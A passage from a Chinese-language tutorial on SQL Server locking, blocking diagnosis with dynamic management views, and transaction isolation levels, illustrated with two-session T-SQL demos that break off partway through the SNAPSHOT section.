<h2 id="锁定和阻塞"><a href="#锁定和阻塞" class="headerlink" title="锁定和阻塞"></a>锁定和阻塞</h2><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p>（1）锁是什么鬼？<br>&emsp;&emsp;锁是事务获取的一种控制资源，用于保护数据资源，防止其他事务对数据进行冲突的或不兼容的访问。</p>
<p>（2）锁模式及其兼容性<br>&emsp;&emsp;主要有两种主要的锁模式 —— <strong>排它锁（Exclusive Lock）</strong> 和 <strong>共享锁（Shared Lock）</strong>。<br>&emsp;&emsp;当试图修改数据时，事务会为所依赖的数据资源请求排它锁，一旦授予，事务将一直持有排它锁，直至事务完成。在事务执行过程中，其他事务就不能再获得该资源的任何类型的锁。<br>&emsp;&emsp;当试图读取数据时，事务默认会为所依赖的数据资源请求共享锁，读操作一完成，就立即释放共享锁。在事务执行过程中，其他事务仍然能够获得该资源的共享锁。</p>
<figure class="image-box">
                <img src="30.png" alt title class>
                <p></p>
            </figure>

<p>（3）可锁定资源的类型<br>&emsp;&emsp;SQL Server 可以锁定不同类型或粒度的资源，这些资源类型包括 RID 或 KEY（行），PAGE（页）、对象（例如：表）及数据库等。</p>
<h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><p>（1）阻塞是个什么鬼？<br>&emsp;&emsp;如果一个事务持有某一数据资源上的锁，而另一事务请求相同资源上的不兼容的锁，则对新锁的请求将被阻塞，发出请求的事务进入等待状态。默认情况下，被阻塞的请求会一直等待，直到原来的事务释放相关的锁。</p>
<blockquote>
<p>&emsp;&emsp;只要能够在合理的时间范围内满足请求，系统中的阻塞就是正常的。但是，如果一些请求等待了太长时间，可能就需要手工排除阻塞状态，看看能采取什么措施来防止这样长时间的延迟。</p>
</blockquote>
<p>（2）近距离观测阻塞<br>&emsp;&emsp;Step1. 打开两个独立的查询窗口，这里称之为 Connection A，Connection B</p>
<p>&emsp;&emsp;Step2. 在 Connection A 中运行以下代码（这里 productid=2 的 unitprice 本来为 19）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line">  <span class="keyword">UPDATE</span> Production.Products <span class="keyword">SET</span> unitprice=unitprice+<span class="number">1.00</span></span><br><span class="line">  <span class="keyword">WHERE</span> productid=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;为了更新这一行，会话必须先获得一个排它锁，如果更新成功，SQL Server 会向会话授予这个锁。</p>
<p>&emsp;&emsp;Step3. 在 Connection B 中运行以下代码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;默认情况下，该会话需要一个共享锁，但因为共享锁和排它锁是不兼容的，所以该会话被阻塞，进入等待状态。</p>
<figure class="image-box">
                <img src="31.png" alt title class>
                <p></p>
            </figure>

<p>（3）如何检测阻塞<br>&emsp;&emsp;假设我们的系统里边出现了阻塞，而且被阻塞了很长时间，如何去检测和排除呢？<br>&emsp;&emsp;① 继续上例，打开一个新的会话，称之为 Connection C，查询动态管理视图（DMV）<code>sys.dm_tran_locks</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Lock info</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">-- use * to explore</span></span><br><span class="line">  request_session_id            <span class="keyword">AS</span> spid,</span><br><span class="line">  resource_type                 <span class="keyword">AS</span> restype,</span><br><span class="line">  resource_database_id          <span class="keyword">AS</span> dbid,</span><br><span class="line">  DB_NAME(resource_database_id) <span class="keyword">AS</span> dbname,</span><br><span class="line">  resource_description          <span class="keyword">AS</span> res,</span><br><span class="line">  resource_associated_entity_id <span class="keyword">AS</span> resid,</span><br><span class="line">  request_mode                  <span class="keyword">AS</span> <span class="keyword">mode</span>,</span><br><span class="line">  request_status                <span class="keyword">AS</span> <span class="keyword">status</span></span><br><span class="line"><span class="keyword">FROM</span> sys.dm_tran_locks;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 运行上面的代码，可以得到以下输出：</p>
<figure class="image-box">
                <img src="32.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;③ 每个会话都有唯一的服务器进程标识符（SPID），可以通过查询<code>@@SPID</code>函数来查看会话 ID。另外，当前会话的 SPID 还可以在查询窗口的标题栏中找到。</p>
<figure class="image-box">
                <img src="33.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;④ 在前面查询的输出中，可以观察到进程 53 正在等待请求 TSQLFundamental2008 数据库中一个行的共享锁。但是，进程 52 持有同一个行上的排它锁。沿着 52 和 53 的所层次结构向上检查：（查询<code>sys.dm_exec_connections</code>的动态管理视图，筛选阻塞链中涉及到的那些 SPID）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection info</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">-- use * to explore</span></span><br><span class="line">  session_id <span class="keyword">AS</span> spid,</span><br><span class="line">  <span class="keyword">connect_time</span>,</span><br><span class="line">  last_read,</span><br><span class="line">  last_write,</span><br><span class="line">  most_recent_sql_handle</span><br><span class="line"><span class="keyword">FROM</span> sys.dm_exec_connections</span><br><span class="line"><span class="keyword">WHERE</span> session_id <span class="keyword">IN</span>(<span class="number">52</span>, <span class="number">53</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;查询结果输出如下：</p>
<figure class="image-box">
                <img src="34.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;⑤ 借助交叉联接，和<code>sys.dm_exec_sql_text</code>表函数生成查询结果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- SQL text</span></span><br><span class="line"><span class="keyword">SELECT</span> session_id, <span class="built_in">text</span> </span><br><span class="line"><span class="keyword">FROM</span> sys.dm_exec_connections</span><br><span class="line">  <span class="keyword">CROSS</span> <span class="keyword">APPLY</span> sys.dm_exec_sql_text(most_recent_sql_handle) <span class="keyword">AS</span> ST </span><br><span class="line"><span class="keyword">WHERE</span> session_id <span class="keyword">IN</span>(<span class="number">52</span>, <span class="number">53</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;查询结果如下，我们可以达到阻塞链中涉及到的每个联接最后调用的批处理代码：</p>
<figure class="image-box">
                <img src="35.png" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;以上就显示了进程 53 正在等待的执行代码，因为这是该进程最后执行的一个操作。对于阻塞进程来说，通过这个例子能够看到是哪条语句导致了问题。</p>
<p>（4）如何解除阻塞<br>&emsp;&emsp;① 设置超时时间<br>&emsp;&emsp;首先取消掉原来 Connection B 中的查询，然后执行以下代码：这里我们限制会话等待释放锁的时间为 5 秒：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Session B</span></span><br><span class="line"><span class="keyword">SET</span> LOCK_TIMEOUT <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后 5 秒之后我们可以看到以下执行结果：</p>
<figure class="image-box">
                <img src="36.png" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;注意：锁定超时不会引发事务回滚。</p>
<p>&emsp;&emsp;② <code>KILL</code>掉引起阻塞的进程<br>&emsp;&emsp;在 Connection C 中执行以下语句，终止 SPID=52 中的更新事务而产生的效果，于是 SPID=52 中的事务的回滚，同时释放排它锁。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--KILL SPID=52</span></span><br><span class="line"><span class="keyword">KILL</span> <span class="number">52</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时再在 Connection B 中执行查询，便可以查到回滚后的结果（仍然是 19）：</p>
<figure class="image-box">
                <img src="37.png" alt title class>
                <p></p>
            </figure>

<h2 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h2><p>&emsp;&emsp;隔离级别用于决定如何控制并发用户读写数据的操作。前面说到，读操作默认使用共享锁，写操作需要使用排它锁。对于操作获得的锁，以及锁的持续时间来说，虽然不能控制写操作的处理方式，但可以控制读操作的处理方式。作为对读操作的行为进行控制的一种结果，也会隐含地影响写操作的行为方式。<br>&emsp;&emsp;为此，可以在会话级别上用会话选项来设置隔离级别，也可以在查询级别上用表提示（Table Hint）来设置隔离级别。<br>&emsp;&emsp;在 SQL Server 中，可以设置的隔离级别有 6 个：<code>READ UNCOMMITED</code>（未提交读）、<code>READ COMMITED</code>（已提交读）、<code>REPEATABLE READ</code>（可重复读）、<code>SERIALIZEABLE</code>（可序列化）、<code>SNAPSHOT</code>（快照）和<code>READ COMMITED SNAPSHOT</code>（已经提交读隔离）。最后两个<code>SNAPSHOT</code>和<code>READ COMMITED SNAPSHOT</code>是在 SQL Server 2005 中引入的。<br>&emsp;&emsp;要设置整个会话级别的隔离级别，可以使用以下语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> &lt;<span class="keyword">isolation</span> <span class="keyword">name</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;也可以使用表提示来设置查询级别的隔离级别：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> &lt;<span class="keyword">table</span>&gt; <span class="keyword">WITH</span> &lt;<span class="keyword">isolation</span> <span class="keyword">name</span>&gt;;</span><br></pre></td></tr></table></figure>

<h3 id="READ-UNCOMMITED-未提交读"><a href="#READ-UNCOMMITED-未提交读" class="headerlink" title="READ UNCOMMITED 未提交读"></a>READ UNCOMMITED 未提交读</h3><p>&emsp;&emsp;未提交读是最低的隔离级别，读操作不会请求共享锁。换句话说，在该级别下的读操作正在读取数据时，写操作可以同时对这些数据进行修改。</p>
<p>&emsp;&emsp;同样，使用两个会话来模拟：<br>&emsp;&emsp;Step1. 在 Connection A 中运行以下代码，更新产品 2 的单价，为当前值（19.00）增加 1.00，然后查询该产品：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line"><span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="38.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step2. 在 Connection B 中运行以下代码，首先设置隔离级别为未提交读，再查询产品 2 所在的记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection B</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">READ</span> UNCOMMITTED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;因为这个读操作不用请求共享锁，因此不会和其他事务发生冲突，该查询返回了如下图所示的修改后的状态，即使这一状态还没有被提交：</p>
<figure class="image-box">
                <img src="39.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step3. 在 Connection A 中运行以下代码回滚事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ROLLBACK</span> TRAN;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;这个回滚操作撤销了对产品 2 的更新，这时它的价格被修改回了 19.00，但是读操作此前获得的 20.00 再也不会被提交了。这就是<strong>脏读</strong>的一个实例！</p>
</blockquote>
<figure class="image-box">
                <img src="40.png" alt title class>
                <p></p>
            </figure>

<h3 id="READ-COMMITED-已提交读"><a href="#READ-COMMITED-已提交读" class="headerlink" title="READ COMMITED 已提交读"></a>READ COMMITED 已提交读</h3><p>&emsp;&emsp;刚刚说到，未提交到会引起脏读，能够防止脏读的最低隔离级别是已提交读，这也是所有 SQL Server 版本默认使用的隔离级别。如其名称所示，这个隔离级别只允许读取已经提交的修改，它要求读操作必须获得共享锁才能操作，从而防止读取未提交的修改。</p>
<p>&emsp;&emsp;继续使用两个会话来模拟：<br>&emsp;&emsp;Step1. 在 Connection A 中运行以下代码，更新产品 2 的价格，再查询显示价格：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line"><span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="41.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step2. 再在 Connection B 中运行以下代码，这段代码将会话的隔离级别设置为已提交读，再查询产品 2 所在的行记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">READ</span> COMMITTED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时该会话语句会被阻塞，因为它需要获取共享锁才能进行读操作，而它与会话 A 的写操作持有的排它锁相冲突。这里因为我设置了默认会话阻塞超时时间，所以出现了以下输出：</p>
<figure class="image-box">
                <img src="42.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step3. 在 Connection A 中运行以下代码，提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step4. 回到 Connection B，此时会得到以下输出：</p>
<figure class="image-box">
                <img src="43.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;在已提交读级别下，不会读取脏数据，只能读取已经提交过的修改。但是，该级别下，其他事务可以在两个读操作之间更改数据资源，读操作因而可能每次得到不同的取值。这种现象被称为<strong>不可重复读</strong>。</p>
</blockquote>
<h3 id="REPEATABLE-READ-可重复读"><a href="#REPEATABLE-READ-可重复读" class="headerlink" title="REPEATABLE READ 可重复读"></a>REPEATABLE READ 可重复读</h3><p>&emsp;&emsp;如果想保证在事务内进行的两个读操作之间，其他任何事务都不能修改由当前事务读取的数据，则需要将隔离级别升级为可重复读。在该级别下，十五中的读操作不但需要获得共享锁才能读数据，而且获得的共享锁将一直保持到事务完成为止。换句话说，在事务完成之前，没有其他事务能够获得排它锁以修改这一数据资源，由此来保证实现可重复的读取。<br>&emsp;&emsp;Step1. 为了重新演示可重复读的示例，首先需要将刚刚的测试数据清理掉，在 Connection A 和 B 中执行以下代码：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Clear Test Data</span></span><br><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line"><span class="keyword">SET</span> unitprice = <span class="number">19.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step2. 在 Connection A 中运行以下代码，将会话的隔离级别设置为可重复读，再查询产品 2 所在的行记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> REPEATABLE <span class="keyword">READ</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="44.png" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;这时该会话仍然持有产品 2 上的共享锁，因为在该隔离级别下，共享锁要一直保持到事务结束为止。</p>
<p>&emsp;&emsp;Step3. 在 Connection B 中尝试对产品 2 这一行进行修改：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> Production.Products</span><br><span class="line">  <span class="keyword">SET</span> unitprice = unitprice + <span class="number">1.00</span></span><br><span class="line"><span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时该会话已被阻塞，因为修改操作锁请求的排它锁与前面会话授予的共享锁有冲突。换句话说，如果读操作是在未提交读或已提交读级别下运行的，那么事务此时将不再持有共享锁，Connection B 尝试修改改行的操作应该能够成功。<br>&emsp;&emsp;同样，由于我设置了超时释放时间，因此会有以下输出：</p>
<figure class="image-box">
                <img src="45.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step4. 回到 Connection A，运行以下代码，再次查询产品 2 所在的行，提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">SELECT</span> productid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> productid = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时的返回结果仍然与第一次相同：</p>
<figure class="image-box">
                <img src="46.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step5. 这时再执行 Connection B 中的更新语句，便能够正常获得排它锁了，于是执行成功，价格变为了 20.00。</p>
<blockquote>
<p>&emsp;&emsp;可重复读隔离级别不仅可以<strong>防止不可重复读</strong>，另外还能<strong>防止丢失更新</strong>。丢失更新是指两个事务读取了同一个值，然后基于最初读取的值进行计算，接着再更新该值，就会发生丢失更新的问题。这是因为在可重复读隔离级别下，两个事务在第一次读操作之后都保留有共享锁，所以其中一个都不能成功获得为了更新数据而需要的排它锁。但是，<strong>负面影响就是会导致死锁</strong>。<br>&emsp;&emsp;在可重复读级别下运行的事务，读操作获得的共享锁将一直保持到事务结束。因此可以保证在事务中第一次读取某些行后，还可以重复读取这些行。但是，事务只锁定查询第一次运行时找到的那些行，而不会锁定查询结果范围外的其他行。因此，在同一事务进行第二次读取之前，如果其他事务插入了新行，而且新行也能满足读操作额查询过滤条件，那么这些新行也会出现在第二次读操作返回的结果中。这些新行称之为幻影，这种读操作也被称为<strong>幻读</strong>。</p>
</blockquote>
<h3 id="SERIALIZEABLE-可序列化"><a href="#SERIALIZEABLE-可序列化" class="headerlink" title="SERIALIZEABLE 可序列化"></a>SERIALIZEABLE 可序列化</h3><p>&emsp;&emsp;为了避免刚刚提到的幻读，需要将隔离级别设置为可序列化。可序列化级别的处理方式与可重复读类似：读操作需要获得共享锁才能读取数据并一直保留到事务结束，不同之处在于在可序列化级别下，读操作不仅锁定了满足查询条件的那些行，还锁定了可能满足查询条件的行。换句话说，如果其他事务试图增加能够满足操作的查询条件的新行，当前事务就会阻塞这样的操作。</p>
<p>&emsp;&emsp;同样，继续来模拟：<br>&emsp;&emsp;Step1. 在 Connection A 中运行代码，设置隔离级别为可序列化，再查询产品分类等于 1 的所有产品：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection A</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">TRANSACTION</span> <span class="keyword">ISOLATION</span> <span class="keyword">LEVEL</span> <span class="keyword">SERIALIZABLE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span> TRAN</span><br><span class="line"></span><br><span class="line">  <span class="keyword">SELECT</span> productid, productname, categoryid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> categoryid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="47.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step2. 在 Connection B 中运行代码，尝试插入一个分类等于 1 的新产品：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Connection B</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Production.Products</span><br><span class="line">    (productname, supplierid, categoryid,</span><br><span class="line">     unitprice, discontinued)</span><br><span class="line">  <span class="keyword">VALUES</span>(<span class="string">'Product ABCDE'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">20.00</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时，该操作会被阻塞。因为在可序列化级别下，前面的读操作不仅锁定了满足查询条件的那些行，还锁定了可能满足查询条件的行。<br>&emsp;&emsp;同样，由于我设置了超时释放时间，因此会有以下输出：</p>
<figure class="image-box">
                <img src="48.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step3. 回到 Connection A，运行以下代码，再次查询分类 1 的产品，最后提交事务：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">SELECT</span> productid, productname, categoryid, unitprice</span><br><span class="line">  <span class="keyword">FROM</span> Production.Products</span><br><span class="line">  <span class="keyword">WHERE</span> categoryid = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span> TRAN;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step4. 回到 Connection B，这时 Connection B 就已经获得了等候已久的排它锁，插入了新行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Production.Products</span><br><span class="line">    (productname, supplierid, categoryid,</span><br><span class="line">     unitprice, discontinued)</span><br><span class="line">  <span class="keyword">VALUES</span>(<span class="string">'Product ABCDE'</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">20.00</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> productid, productname, categoryid, unitprice</span><br><span class="line"><span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> categoryid = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="49.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;Step5. 为了后面的演示，运行以下代码清理测试数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Cleanup</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Production.Products</span><br><span class="line"><span class="keyword">WHERE</span> productid &gt; <span class="number">77</span>;</span><br><span class="line"></span><br><span class="line">DBCC CHECKIDENT ('Production.Products', RESEED, 77);</span><br></pre></td></tr></table></figure>

<h3 id="SNAPSHOT-快照"><a href="#SNAPSHOT-快照" class="headerlink" title="SNAPSHOT 快照"></a>SNAPSHOT 快照</h3><p>&emsp;&emsp;首先解释一下什么是快照？事务已经提交的行的上一个版本存在<code>tempdb</code>数据库中，这是 SQL Server 引入的一个新功能。<br>&emsp;&emsp;以这种行版本控制技术为基础，SQL Server 增加了两个新的隔离级别：<code>SNAPSHOT</code>和<code>READ COMMITED SNAPSHOT</code>。如果启用任何一种基于快照的隔离级别，<code>DELETE</code>和<code>UPDATE</code>语句在做出修改前都会把行的当前版本复制到<code>tempdb</code>数据库中；<code>INSERT</code>语句则不会，因为这时还没有行的旧版本。<br>&emsp;&emsp;在<code>SNAPSHOPT</code>（快照）隔离级别下，当读取数据时，可以保证读操作<strong>读取的行是事务开始时可用的最后提交的版本</strong>。</p>
<p>&emsp;&emsp;下面来模拟一下该隔离级别下的场景：<br>&emsp;&emsp;Step1. 还是打开两个会话窗口，在其中一个执行以下代码，设置隔离级别为<code>SNAPSHOT</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Allow SNAPSHOT isolation in the database</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> TSQLFundamentals2008 <span class="keyword">SET</span> ALLOW_SNAPSHOT_ISOLATION <span class="keyword">ON</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Step2. 在 Connection A 中运行以下代码，更新产品 2 的价格，然后再查询该产品的价格：</p>
